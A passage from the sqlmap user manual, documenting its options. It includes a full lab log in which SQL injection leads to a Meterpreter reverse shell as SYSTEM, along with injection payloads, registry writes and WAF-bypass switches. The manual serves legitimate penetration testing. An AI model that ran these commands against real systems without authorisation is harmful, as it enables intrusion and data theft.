the shellcode and implements  four different techniques to execute it on the database server. These  techniques are:<br />◇ Database <strong>in-memory execution of the Metasploit&#39;s shellcode</strong> via sqlmap own user-defined function <code>sys_bineval()</code>. Supported on MySQL and PostgreSQL - switch <code>--os-pwn</code>.<br />◇ Upload and execution of a Metasploit&#39;s <strong>stand-alone payload stager</strong> via sqlmap own user-defined function <code>sys_exec()</code> on MySQL and PostgreSQL or via <code>xp_cmdshell()</code> on Microsoft SQL Server - switch <code>--os-pwn</code>.<br />◇ Execution of Metasploit&#39;s shellcode by performing a <strong>SMB reflection attack</strong> (<a href="http://www.microsoft.com/technet/security/Bulletin/MS08-068.mspx">MS08-068</a>) with a UNC path request from the database server tothe attacker&#39;s machine where the Metasploit <code>smb_relay</code> server exploit listens. Supported when running sqlmap with high privileges (<code>uid=0</code>) on Linux/Unix and the target DBMS runs as Administrator on Windows - switch <code>--os-smbrelay</code>.<br />◇ Database in-memory execution of the Metasploit&#39;s shellcode by exploiting <strong>Microsoft SQL Server 2000 and 2005</strong><strong><code>sp_replwritetovarbin</code></strong><strong> stored procedure heap-based buffer overflow</strong> (<a href="http://www.microsoft.com/technet/security/bulletin/ms09-004.mspx">MS09-004</a>). sqlmap has its own exploit to trigger thevulnerability with automatic DEP memory protection bypass, but it relies on Metasploit to generate the shellcode to get executed upon successful exploitation - switch <code>--os-bof</code>.<br /><br />These techniques are detailed in the white paper <a href="http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857">Advanced SQL injection to operating system full control</a> and in the slide deck <a href="http://www.slideshare.net/inquis/expanding-the-control-over-the-operating-system-from-the-database">Expanding the control over the operating system from the database</a>.<br />Example against a MySQL target:<br /><code>$ python sqlmap.py -u &quot;http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?\<br />id=1&quot; --os-pwn --msf-path /software/metasploit<br /><br />[...]<br />[hh:mm:31] [INFO] the back-end DBMS is MySQL<br />web server operating system: Windows 2003<br />web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0<br />back-end DBMS: MySQL 5.0<br />[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system<br />[hh:mm:31] [INFO] the back-end DBMS operating system is Windows<br />how do you want to establish the tunnel?<br />[1] TCP: Metasploit Framework (default)<br />[2] ICMP: icmpsh - ICMP tunneling<br />&gt; <br />[hh:mm:32] [INFO] testing if current user is DBA<br />[hh:mm:32] [INFO] fetching current user<br />what is the back-end database management system architecture?<br />[1] 32-bit (default)<br />[2] 64-bit<br />&gt; <br />[hh:mm:33] [INFO] checking if UDF &#39;sys_bineval&#39; already exist<br />[hh:mm:33] [INFO] checking if UDF &#39;sys_exec&#39; already exist<br />[hh:mm:33] [INFO] detecting back-end DBMS version from its banner<br />[hh:mm:33] [INFO] retrieving MySQL base directory absolute path<br />[hh:mm:34] [INFO] creating UDF &#39;sys_bineval&#39; from the binary UDF file<br />[hh:mm:34] [INFO] creating UDF &#39;sys_exec&#39; from the binary UDF file<br />how do you want to execute the Metasploit shellcode on the back-end database und<br />erlying operating system?<br />[1] Via UDF &#39;sys_bineval&#39; (in-memory way, anti-forensics, default)<br />[2] Stand-alone payload stager (file system way)<br />&gt; <br />[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode <br />which connection type do you want to use?<br />[1] Reverse TCP: Connect back from the database host to this machine (default)<br />[2] Reverse TCP: Try to connect back from the database host to this machine, on <br />all ports <br />between the specified and 65535<br />[3] Bind TCP: Listen on the database host for a connection<br />&gt; <br />which is the local address? [192.168.136.1] <br />which local port number do you want to use? [60641] <br />which payload do you want to use?<br />[1] Meterpreter (default)<br />[2] Shell<br />[3] VNC<br />&gt; <br />[hh:mm:40] [INFO] creation in progress ... done<br />[hh:mm:43] [INFO] running Metasploit Framework command line interface locally, p<br />lease wait..<br /><br />                                _<br />                                | |      o<br />_  _  _    _ _|_  __,   ,    _  | |  __    _|_<br />/ |/ |/ |  |/  |  /  |  / \_|/ \_|/  /  \_|  |<br />|  |  |_/|__/|_/\_/|_/ \/ |__/ |__/\__/ |_/|_/<br />                        /|<br />                        \|<br /><br /><br />    =[ metasploit v3.7.0-dev [core:3.7 api:1.0]<br />+ -- --=[ 674 exploits - 351 auxiliary<br />+ -- --=[ 217 payloads - 27 encoders - 8 nops<br />    =[ svn r12272 updated 4 days ago (2011.04.07)<br /><br />PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br />EXITFUNC =&gt; thread<br />LPORT =&gt; 60641<br />LHOST =&gt; 192.168.136.1<br />[*] Started reverse handler on 192.168.136.1:60641 <br />[*] Starting the payload handler...<br />[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF &#39;sys_b<br />ineval&#39;, please wait..<br />[*] Sending stage (749056 bytes) to 192.168.136.129<br />[*] Meterpreter session 1 opened (192.168.136.1:60641 -&gt; 192.168.136.129:1689) a<br />t Mon Apr 11 hh:mm:52 +0100 2011<br /><br />meterpreter &gt; Loading extension espia...success.<br />meterpreter &gt; Loading extension incognito...success.<br />meterpreter &gt; [-] The &#39;priv&#39; extension has already been loaded.<br />meterpreter &gt; Loading extension sniffer...success.<br />meterpreter &gt; System Language : en_US<br />OS              : Windows .NET Server (Build 3790, Service Pack 2).<br />Computer        : W2K3R2<br />Architecture    : x86<br />Meterpreter     : x86/win32<br />meterpreter &gt; Server username: NT AUTHORITY\SYSTEM<br />meterpreter &gt; ipconfig<br /><br />MS TCP Loopback interface<br />Hardware MAC: 00:00:00:00:00:00<br />IP Address  : 127.0.0.1<br />Netmask     : 255.0.0.0<br /><br /><br /><br />Intel(R) PRO/1000 MT Network Connection<br />Hardware MAC: 00:0c:29:fc:79:39<br />IP Address  : 192.168.136.129<br />Netmask     : 255.255.255.0<br /><br /><br />meterpreter &gt; exit<br /><br />[*] Meterpreter session 1 closed.  Reason: User exit<br /></code><br />By default MySQL on Windows runs as <code>SYSTEM</code>, however PostgreSQL runs as a low-privileged user <code>postgres</code> on both Windows and Linux. Microsoft SQL Server 2000 by default runs as <code>SYSTEM</code>, whereas Microsoft SQL Server 2005 and 2008 run most of the times as <code>NETWORK SERVICE</code> and sometimes as <code>LOCAL SERVICE</code>.<br />It is possible to provide sqlmap with switch <code>--priv-esc</code> to perform a <strong>database process&#39; user privilege escalation</strong> via Metasploit&#39;s <code>getsystem</code> command which include, among others, the <a href="http://archives.neohapsis.com/archives/fulldisclosure/2010-01/0346.html">kitrap0d</a> technique (<a href="http://www.microsoft.com/technet/security/bulletin/ms10-015.mspx">MS10-015</a>).<br /><br /><br /><br /><h2>Windows registry access</h2><br />It is possible to access Windows registry when the back-end database  management system is either MySQL, PostgreSQL or Microsoft SQL Server,  and when the web application supports stacked queries. Also, session  user has to have the needed privileges to access it.<br /><br /><br /><br /><h3>Read a Windows registry key value</h3><br />Switch: <code>--reg-read</code><br />Using this switch you can read registry key values.<br /><br /><br /><br /><h3>Write a Windows registry key value</h3><br />Switch: <code>--reg-add</code><br />Using this switch you can write registry key values.<br /><br /><br /><br /><h3>Delete a Windows registry key</h3><br />Switch: <code>--reg-del</code><br />Using this switch you can delete registry keys.<br /><br /><br /><br /><h3>Auxiliary registry options</h3><br />Options: <code>--reg-key</code>, <code>--reg-value</code>, <code>--reg-data</code> and <code>--reg-type</code><br />These options can be used to provide data needed for proper running of switches <code>--reg-read</code>, <code>--reg-add</code> and  <code>--reg-del</code>. So, instead of providing registry key information when asked, you can use them at command prompt as program arguments.<br />With <code>--reg-key</code> option you specify used Windows registry key path, with <code>--reg-value</code> value item name inside provided key, with <code>--reg-data</code> value data, while with <code>--reg-type</code> option you specify type of the value item.<br />A sample command line for adding a registry key hive follows:<br /><code>$ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --r\<br />eg-add --reg-key=&quot;HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap&quot; --reg-value=Test --reg-ty\<br />pe=REG_SZ --reg-data=1<br /></code><br /><br /><br /><br /><h2>General</h2><br />These options can be used to set some general working parameters.<br /><br /><br /><br /><h3>Load session from a stored (.sqlite) file</h3><br />Option: <code>-s</code><br />sqlmap automatically creates a persistent session SQLite file for  each target, inside dedicated output directory, where it stores all data  required for session resumal. If user wants to explicitly set the  session file location (e.g. for storing of session data for multiple  targets at one place) he can use this option.<br /><br /><br /><br /><h3>Log HTTP(s) traffic to a textual file</h3><br />Option: <code>-t</code><br />This option requires an argument that specified the textual file to  write all HTTP(s) traffic generated by sqlmap - HTTP(S) requests and  HTTP(S) responses.<br />This is useful primarily for debug purposes - when you provide the developers with a potential bug report, send this file too.<br /><br /><br /><br /><h3>Set answers for questions</h3><br />Option: <code>--answers</code><br />In case that user wants to automatically set up answers for questions, even if <code>--batch</code>  is used, using this option he can do it by providing any part of  question together with answer after an equal sign. Also, answers for  different question can be split with delimiter character <code>,</code>.<br />Example against a MySQL target:<br /><code>$ python sqlmap.py -u &quot;http://192.168.22.128/sqlmap/mysql/get_int.php?id=1&quot;--te\<br />chnique=E --answers=&quot;extending=N&quot; --batch<br />[...]<br />[xx:xx:56] [INFO] testing for SQL injection on GET parameter &#39;id&#39;<br />heuristic (parsing) test showed that the back-end DBMS could be &#39;MySQL&#39;. Do you <br />want to skip test payloads specific for other DBMSes? [Y/n] Y<br />[xx:xx:56] [INFO] do you want to include all tests for &#39;MySQL&#39; extending provide<br />d level (1) and risk (1)? [Y/n] N<br />[...]<br /></code><br /><br /><br /><br /><h3>Declare parameters containing Base64 encoded data</h3><br />Option: <code>--base64</code><br />In case that the target web application is using Base64 encoding to  store data inside specific parameters (e.g. Base64 encoded JSON  dictionary), user can declare it with option <code>--base64</code> and thus instruct sqlmap to properly test the underlying values.<br />Example usage (Note: <code>Base64(&#39;{&quot;id&quot;: 1}&#39;) == &#39;eyJpZCI6IDF9&#39;</code>):<br /><code>$ python sqlmap.py -u http://192.168.22.128/sqlmap/mysql/get_base64?value=eyJpZC\<br />I6IDF9 -v 5 --base64=value<br />[...]<br />[23:43:35] [INFO] testing &#39;Boolean-based blind - Parameter replace (original valu<br />e)&#39;<br />[23:43:35] [PAYLOAD] KFNFTEVDVCAoQ0FTRSBXSEVOICgzODY1PTUzMTQpIFRIRU4gJ3siaWQiOiAx<br />fScgRUxTRSAoU0VMRUNUIDUzMTQgVU5JT04gU0VMRUNUIDE5MzIpIEVORCkp<br />[23:43:35] [TRAFFIC OUT] HTTP request [#11]:<br />GET /?value=KFNFTEVDVCAoQ0FTRSBXSEVOICgzODY1PTUzMTQpIFRIRU4gJ3siaWQiOiAxfScgRUxTR<br />SAoU0VMRUNUIDUzMTQgVU5JT04gU0VMRUNUIDE5MzIpIEVORCkp HTTP/1.1<br />Host: localhost<br />Cache-control: no-cache<br />Accept-encoding: gzip,deflate<br />Accept: */*<br />User-agent: sqlmap/1.4.4.3#dev (http://sqlmap.org)<br />Connection: close<br />[...]<br /></code><br /><br /><br /><br /><h3>Act in non-interactive mode</h3><br />Switch: <code>--batch</code><br />If you want sqlmap to run as a batch tool, without any user&#39;s  interaction  when sqlmap requires it, you can force that by using switch  <code>--batch</code>. This will leave sqlmap to go with a default behaviour whenever user&#39;s input would be required.<br /><br /><br /><br /><h3>Binary content retrieval</h3><br />Option <code>--binary-fields</code><br />In case of binary content retrieval, like in example of tables having column(s) with stored binary values (e.g. column <code>password</code> with binary stored password hash values), it is possible to use option <code>--binary-fields</code>  for (extra) proper handling by sqlmap. All those fields (i.e. table  columns) are then retrieved and represented in their hexadecimal  representation, so afterwards they could be properly processed with  other tools (e.g. <code>john</code>).<br /><br /><br /><br /><h3>Custom (blind) SQL injection charset</h3><br />Option: <code>--charset</code><br />During boolean-based blind and time-based blind SQL injection cases,  user can force the usage of custom charset to speed-up the data  retrieval process. For example, in case of dumping message digest values  (e.g. SHA1), by using (e.g.) <code>--charset=&quot;0123456789abcdef&quot;</code> expected number of requests is around 30% less than in regular run.<br /><br /><br /><br /><h3>Crawl the website starting from the target URL</h3><br />Option: <code>--crawl</code><br />sqlmap can collect potentially vulnerable links by collecting them  (crawling) starting from the target location. Using this option user can  set a depth (distance from a starting location) below which sqlmap  won&#39;t go in collecting phase, as the process is being done recursively  as long as there are new links to be visited.<br />Example run against a MySQL target:<br /><code>$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/&quot; --batch --crawl=3<br />[...]<br />[xx:xx:53] [INFO] starting crawler<br />[xx:xx:53] [INFO] searching for links with depth 1<br />[xx:xx:53] [WARNING] running in a single-thread mode. This could take a while<br />[xx:xx:53] [INFO] searching for links with depth 2<br />[xx:xx:54] [INFO] heuristics detected web page charset &#39;ascii&#39;<br />[xx:xx:00] [INFO] 42/56 links visited (75%)<br />[...]<br /></code><br />Option <code>--crawl-exclude</code><br />With this option you can exclude pages from crawling by providing a  regular expression. For example, if you want to skip all pages that have  the keyword <code>logout</code> in their paths, you can use <code>--crawl-exclude=logout</code>.<br /><br /><br /><br /><h3>Delimiting character used in CSV output</h3><br />Option: <code>--csv-del</code><br />When data being dumped is stored into the CSV format (<code>--dump-format=CSV</code>), entries have to be separated with a &quot;separation value&quot; (default is <code>,</code>). In case that user wants to override its default value he can use this option (e.g. <code>--csv-del=&quot;;&quot;</code>).<br /><br /><br /><br /><h3>DBMS authentication credentials</h3><br />Option: <code>--dbms-cred</code><br />In some cases user will be warned that some operations failed because  of lack of current DBMS user privileges and that he could try to use  this option. In those cases, if he provides <code>admin</code> user  credentials to sqlmap by using this option, sqlmap will try to rerun the  problematic part with specialized &quot;run as&quot; mechanisms (e.g. <code>OPENROWSET</code> on Microsoft SQL Server) using those credentials.<br /><br /><br /><br /><h3>Format of dumped data</h3><br />Option: <code>--dump-format</code><br />sqlmap supports three different types of formatting when storing  dumped table data into the corresponding file inside an output  directory: <code>CSV</code>, <code>HTML</code> and <code>SQLITE</code>. Default one is <code>CSV</code>, where each table row is stored into a textual file line by line, and where each entry is separated with a comma character <code>,</code> (or one provided with option <code>--csv-del</code>). In case of <code>HTML</code>, output is being stored into a HTML file, where each row is represented with a row inside a formatted table. In case of <code>SQLITE</code>,  output is being stored into a SQLITE database, where original table  content is replicated into the corresponding table having a same name.<br /><br /><br /><br /><h3>Force character encoding used for data retrieval</h3><br />Option: <code>--encoding</code><br />For proper decoding of character data sqlmap uses either web server provided information (e.g. HTTP header <code>Content-Type</code>) or a heuristic result coming from a 3rd party library <a href="https://pypi.python.org/pypi/chardet">chardet</a>.<br />Nevertheless, there are cases when this value has to be overwritten,  especially when retrieving data containing international non-ASCII  letters (e.g. <code>--encoding=GBK</code>). It has to be noted that  there is a possibility that character information is going to be  irreversibly lost due to implicit incompatibility between stored  database content and used database connector at the target side.<br /><br /><br /><br /><h3>Estimated time of arrival</h3><br />Switch: <code>--eta</code><br />It is possible to calculate and show in real time the estimated time  of arrival to retrieve each query output. This is shown when the  technique used to retrieve the output is any of the blind SQL injection  types.<br />Example against an Oracle target affected only by boolean-based blind SQL injection:<br /><code>$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id\<br />=1&quot; -b --eta<br /><br />[...]<br />[hh:mm:01] [INFO] the back-end DBMS is Oracle<br />[hh:mm:01] [INFO] fetching banner<br />[hh:mm:01] [INFO] retrieving the length of query output<br />[hh:mm:01] [INFO] retrieved: 64<br />17% [========&gt;                                          ] 11/64  ETA 00:19<br /></code><br />Then:<br /><code>100% [===================================================] 64/64<br />[hh:mm:53] [INFO] retrieved: Oracle Database 10g Enterprise Edition Release 10.2<br />.0.1.0 - Prod<br /><br />web application technology: PHP 5.2.6, Apache 2.2.9<br />back-end DBMS: Oracle<br />banner:    &#39;Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod&#39;<br /></code><br />As you can see, sqlmap first calculates the length of the query  output, then estimates the time of arrival, shows the progress in  percentage and counts the number of retrieved output characters.<br /><br /><br /><br /><h3>Flush session files</h3><br />Option: <code>--flush-session</code><br />As you are already familiar with the concept of a session file from  the description above, it is good to know that you can flush the content  of that file using option <code>--flush-session</code>. This way you  can avoid the caching mechanisms implemented by default in sqlmap. Other  possible way is to manually remove the session file(s).<br /><br /><br /><br /><h3>Parse and test forms&#39; input fields</h3><br />Switch: <code>--forms</code><br />Say that you want to test against SQL injections a huge <em>search form</em> or you want to test a login bypass (typically only two input fields named like <em>username</em> and <em>password</em>), you can either pass to sqlmap the request in a request file (<code>-r</code>), set the POSTed data accordingly (<code>--data</code>) or let sqlmap do it for you!<br />Both of the above mentioned instances, and many others, appear as <code> &lt;form&gt;</code> and <code> &lt;input&gt;</code> tags in HTML response bodies and this is where this switch comes into play.<br />Provide sqlmap with <code>--forms</code> as well as the page where the form can be found as the target URL (<code>-u</code>)  and sqlmap will request the target URL for you, parse the forms it has  and guide you through to test for SQL injection on those form input  fields (parameters) rather than the target URL provided.<br /><br /><br /><br /><h3>Ignore query results stored in session file</h3><br />Switch: <code>--fresh-queries</code><br />As you are already familiar with the concept of a session file from  the description above, it is good to know that you can ignore the query  results by using option <code>--fresh-queries</code>. This way you can keep the session file untouched and for a selected run, avoid the resuming/restoring of queries output.<br /><br /><br /><br /><h3>Use DBMS hex function(s) for data retrieval</h3><br />Switch: <code>--hex</code><br />In lost of cases retrieval of non-ASCII data requires special needs.  One solution for that problem is usage of DBMS hex function(s). Turned  on by this switch, data is encoded to it&#39;s hexadecimal form before being  retrieved and afterwards unencoded to it&#39;s original form.<br />Example against a PostgreSQL target:<br /><code>$ python sqlmap.py -u &quot;http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1&quot; --b\<br />anner --hex -v 3 --parse-errors<br /><br />[...]<br />[xx:xx:14] [INFO] fetching banner<br />[xx:xx:14] [PAYLOAD] 1 AND 5849=CAST((CHR(58)||CHR(118)||CHR(116)||CHR(106)||CHR<br />(58))||(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION() AS CHARACTER(10000)),(CHR(32)<br />))),(CHR(85)||CHR(84)||CHR(70)||CHR(56))),(CHR(72)||CHR(69)||CHR(88))))::text||(<br />CHR(58)||CHR(110)||CHR(120)||CHR(98)||CHR(58)) AS NUMERIC)<br />[xx:xx:15] [INFO] parsed error message: &#39;pg_query() [&lt;a href=&#39;function.pg-query&#39;<br />&gt;function.pg-query&lt;/a&gt;]: Query failed: ERROR:  invalid input syntax for type num<br />eric: &quot;:vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d<br />676e752c20636f6d70696c656420627920474343206763632d342e332e7265616c20284465626961<br />6e2032e332e322d312e312920342e332e32:nxb:&quot; in &lt;b&gt;/var/www/sqlmap/libs/pgsql.inc.p<br />hp&lt;/b&gt; on line &lt;b&gt;35&lt;/b&gt;&#39;<br />[xx:xx:15] [INFO] retrieved: PostgreSQL 8.3.9 on i486-pc-linux-gnu, compiled by <br />GCC gcc-4.3.real (Debian 4.3.2-1.1) 4.3.2<br />[...]<br /></code><br /><br /><br /><br /><h3>Custom output directory path</h3><br />Option: <code>--output-dir</code><br />sqlmap by default stores session and result files inside a subdirectory <code>output</code>. In case you want to use a different location, you can use this option (e.g. <code>--output-dir=/tmp</code>).<br /><br /><br /><br /><h3>Parse DBMS error messages from response pages</h3><br />Switch: <code>--parse-errors</code><br />If the web application is configured in debug mode so that it  displays in the HTTP responses the back-end database management system  error messages, sqlmap can parse and display them for you.<br />This is useful for debugging purposes like understanding why a  certain enumeration or takeover switch does not work - it might be a  matter of session user&#39;s privileges and in this case you would see a  DBMS error message along the lines of <code>Access denied for user  &lt;SESSION USER&gt;</code>.<br />Example against a Microsoft SQL Server target:<br /><code>$ python sqlmap.py -u &quot;http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot;\<br /> --parse-errors<br />[...]<br />[xx:xx:17] [INFO] ORDER BY technique seems to be usable. This should reduce the <br />timeneeded to find the right number of query columns. Automatically extending th<br />e rangefor current UNION query injection technique test<br />[xx:xx:17] [INFO] parsed error message: &#39;Microsoft OLE DB Provider for ODBC Driv<br />ers (0x80040E14)<br />[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 10 i<br />s out of range of the number of items in the select list.<br />&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;&#39;<br />[xx:xx:17] [INFO] parsed error message: &#39;Microsoft OLE DB Provider for ODBC Driv<br />ers (0x80040E14)<br />[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 6 is<br /> out of range of the number of items in the select list.<br />&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;&#39;<br />[xx:xx:17] [INFO] parsed error message: &#39;Microsoft OLE DB Provider for ODBC Driv<br />ers (0x80040E14)<br />[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 4 is<br /> out of range of the number of items in the select list.<br />&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;&#39;<br />[xx:xx:17] [INFO] target URL appears to have 3 columns in query<br />[...]<br /></code><br /><br /><br /><br /><h3>Preprocess (request)</h3><br />Option <code>--preprocess</code><br />Using this option it is possible to use a preprocessing script for  (HTTP) request data prior being sent to the target (e.g. to fine-tune  the request). For example, preprocessing script that appends the dummy  parameter value <code>&amp;foo=bar</code> to POST body:<br /><code>#!/usr/bin/env python<br /><br />def preprocess(req):<br />    if req.data:<br />        req.data += b&#39;&amp;foo=bar&#39;<br /></code><br /><br /><br /><br /><h3>Postprocess (response)</h3><br />Option <code>--postprocess</code><br />Using this option it is possible to use a postprocessing script for  (HTTP) response data prior being used by the sqlmap detection engine  (e.g. to decode data or to remove junk). For example, postprocessing  script that transforms all lowercase characters to uppercase could be:<br /><code>#!/usr/bin/env python<br /><br />def postprocess(page, headers=None, code=None):<br />    return page.upper() if page else page, headers, code<br /></code><br /><br /><br /><br /><h3>Save options in a configuration INI file</h3><br />Option: <code>--save</code><br />It is possible to save the command line options to a configuration  INI file. The generated file can then be edited and passed to sqlmap  with the <code>-c</code> option as explained above.<br /><br /><br /><br /><h3>Update sqlmap</h3><br />Switch: <code>--update</code><br />Using this option you can update the tool to the latest development version directly from the <a href="https://github.com/sqlmapproject/sqlmap.git">Git repository</a>. You obviously need Internet access.<br />If, for any reason, this operation fails, run <code>git pull</code> from your sqlmap working copy. It will perform the exact same operation of switch <code>--update</code>. If you are running sqlmap on Windows, you can use the <a href="http://www.syntevo.com/smartgit/index.html">SmartGit</a> client.<br />This is strongly recommended <strong>before</strong> reporting any bug to the <a href="http://www.sqlmap.org/#ml">mailing lists</a>.<br /><br /><br /><br /><h2>Miscellaneous</h2><br /><br /><br /><br /><h3>Use short mnemonics</h3><br />Option: <code>-z</code><br />It could become tedious to type all desired options and switches, especially for those that are used most often (e.g. <code>--batch --random-agent --ignore-proxy --technique=BEU</code>). There is a simpler and much shorter way how to deal with that problem. In sqlmap it&#39;s called &quot;mnemonics&quot;.<br />Each option and switch can be written in a shorter mnemonic form using option <code>-z</code>, separated with a comma character (<code>,</code>),  where mnemonics represent only the first arbitrarily chosen part of the  original name. There is no strict mapping of options and switches to  their respective shortened counterparts. Only required condition is that  there is no other option nor switch that has a same prefix as the  desired one.<br />Example:<br /><code>$ python sqlmap.py --batch --random-agent --ignore-proxy --technique=BEU -u &quot;ww\<br />w.target.com/vuln.php?id=1&quot;<br /></code><br />can be written (one of many ways) in shorter mnemonic form like:<br /><code>$ python sqlmap.py -z &quot;bat,randoma,ign,tec=BEU&quot; -u &quot;www.target.com/vuln.php?id=\<br />1&quot;<br /></code><br />Another example:<br /><code>$ python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testd\<br />b -T users -u &quot;www.target.com/vuln.php?id=1&quot;<br /></code><br />can be written in shorter mnemonic form like:<br /><code>$ python sqlmap.py -z &quot;ign,flu,bat,tec=U,dump,D=testdb,T=users&quot; -u &quot;www.target.\<br />com/vuln.php?id=1&quot;<br /></code><br /><br /><br /><br /><h3>Alerting on successful SQL injection detection</h3><br />Option: <code>--alert</code><br /><br /><br /><br /><h3>Make a beep sound when SQL injection is found</h3><br />Switch: <code>--beep</code><br />In case that user uses switch <code>--beep</code> he&#39;ll be warned  with a beep sound immediately when SQL injection is found. This is  especially useful when there is a large bulk list (option <code>-m</code>) of target URLs to be tested.<br /><br /><br /><br /><h3>Cleanup the DBMS from sqlmap specific UDF(s) and table(s)</h3><br />Switch: <code>--cleanup</code><br />It is recommended to clean up the back-end database management system from sqlmap temporary table(s) (e.g. <code>sqlmapoutput</code>) and created user-defined function(s) when you are done taking over the underlying operating system or file system. Switch <code>--cleanup</code> will attempt to clean up the DBMS and the file system wherever possible.<br /><br /><br /><br /><h3>Check for dependencies</h3><br />Switch: <code>--dependencies</code><br />sqlmap in some special cases requires independent installation of extra 3rd party libraries (e.g. options <code>-d</code>, switch <code>--os-pwn</code> in case of <code>icmpsh</code> tunneling, option <code>--auth-type</code> in case of <code>NTLM</code>  HTTP authentication type, etc.) and it will warn the user only in such  special cases. But, if you want to independently check for all those  extra 3rd party library dependencies you can use switch <code>--dependencies</code>.<br /><code>$ python sqlmap.py --dependencies<br />[...]<br />[xx:xx:28] [WARNING] sqlmap requires &#39;python-kinterbasdb&#39; third-party library in<br /> order to directly connect to the DBMS Firebird. Download from http://kinterbasd<br />b.sourceforge.net/<br />[xx:xx:28] [WARNING] sqlmap requires &#39;python-pymssql&#39; third-party library in ord<br />er to directly connect to the DBMS Sybase. Download from http://pymssql.sourcefo<br />rge.net/<br />[xx:xx:28] [WARNING] sqlmap requires &#39;python pymysql&#39; third-party library in ord<br />er to directly connect to the DBMS MySQL. Download from https://github.com/peteh<br />unt/PyMySQL/<br />[xx:xx:28] [WARNING] sqlmap requires &#39;python cx_Oracle&#39; third-party library in o<br />rder to directly connect to the DBMS Oracle. Download from http://cx-oracle.sour<br />ceforge.net/<br />[xx:xx:28] [WARNING] sqlmap requires &#39;python-psycopg2&#39; third-party library in or<br />der to directly connect to the DBMS PostgreSQL. Download from http://initd.org/p<br />sycopg/<br />[xx:xx:28] [WARNING] sqlmap requires &#39;python ibm-db&#39; third-party library in orde<br />r to directly connect to the DBMS IBM DB2. Download from http://code.google.com/<br />p/ibm-db/<br />[xx:xx:28] [WARNING] sqlmap requires &#39;python jaydebeapi &amp; python-jpype&#39; third-pa<br />rty library in order to directly connect to the DBMS HSQLDB. Download from https<br />://pypi.python.org/pypi/JayDeBeApi/ &amp; http://jpype.sourceforge.net/<br />[xx:xx:28] [WARNING] sqlmap requires &#39;python-pyodbc&#39; third-party library in orde<br />r to directly connect to the DBMS Microsoft Access. Download from http://pyodbc.<br />googlecode.com/<br />[xx:xx:28] [WARNING] sqlmap requires &#39;python-pymssql&#39; third-party library in ord<br />er to directly connect to the DBMS Microsoft SQL Server. Download from http://py<br />mssql.sourceforge.net/<br />[xx:xx:28] [WARNING] sqlmap requires &#39;python-ntlm&#39; third-party library if you pl<br />an to attack a web application behind NTLM authentication. Download from http://<br />code.google.com/p/python-ntlm/<br />[xx:xx:28] [WARNING] sqlmap requires &#39;websocket-client&#39; third-party library if y<br />ou plan to attack a web application using WebSocket. Download from https://pypi.<br />python.org/pypi/websocket-client/<br /></code><br /><br /><br /><br /><h3>Disable console output coloring</h3><br />Switch: <code>--disable-coloring</code><br />sqlmap by default uses coloring while writting to console. In case of  undesired effects (e.g. console appearance of uninterpreted ANSI  coloring codes like <code>\x01\x1b[0;32m\x02[INFO]</code>) you can disable console output coloring by using this switch.<br /><br /><br /><br /><h3>Use Google dork results from specified page number</h3><br />Option: <code>--gpage</code><br />Default sqlmap behavior with option <code>-g</code> is to do a Google  search and use the first 100 resulting URLs for further SQL injection  testing. However, in combination with this option you can specify with  this option (<code>--gpage</code>) a page other than the first one to retrieve target URLs from.<br /><br /><br /><br /><h3>Use HTTP parameter pollution</h3><br />Switch: <code>--hpp</code><br />HTTP parameter pollution (HPP) is a method for bypassing WAF/IPS protection mechanisms (explained <a href="https://www.imperva.com/resources/glossary/http-parameter-pollution">here</a>)  that is particularly effective against ASP/IIS and ASP.NET/IIS  platforms. If you suspect that the target is behind such protection, you  can try to bypass it by using this switch.<br /><br /><br /><br /><h3>Skip heuristic detection of WAF/IPS protection</h3><br />Switch: <code>--skip-waf</code><br />By default, sqlmap automatically sends inside one of starting  requests a dummy parameter value containing a deliberately &quot;suspicious&quot;  SQL injection payload (e.g. <code>...&amp;foobar=AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2&gt;1</code>).  If target responds differently than for the original request, there is a  high possibility that it&#39;s under some kind of protection.<br />sqlmap will automatically try to identify backend WAF/IPS protection  (if any) so user could do appropriate steps (e.g. use tamper scripts  with <code>--tamper</code>). Currently around 80 different products are  supported (Airlock, Barracuda WAF, etc.) In case of any problems, user  can disable this whole mechanism by providing switch <code>--skip-waf</code>.<br /><br /><br /><br /><h3>Imitate smartphone</h3><br />Switch: <code>--mobile</code><br />Sometimes web servers expose different interfaces toward mobile  phones than to desktop computers. In such cases you can enforce usage of  one of predetermined smartphone HTTP User-Agent header values. By using  this switch, sqlmap will ask you to pick one of popular smartphones  which it will imitate in current run.<br />Example run:<br /><code>$ python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&quot; --mobile<br />[...]<br />which smartphone do you want sqlmap to imitate through HTTP User-Agent header?<br />[1] Apple iPhone 4s (default)<br />[2] BlackBerry 9900<br />[3] Google Nexus 7<br />[4] HP iPAQ 6365<br />[5] HTC Sensation<br />[6] Nokia N97<br />[7] Samsung Galaxy S<br />&gt; 1<br />[...]<br /></code><br /><br /><br /><br /><h3>Work in offline mode (only use session data)</h3><br />Switch: <code>--offline</code><br />By using switch <code>--offline</code> sqlmap will use only previous  session data in data enumeration. This basically means that there will  be zero connection attempts during such run.<br /><br 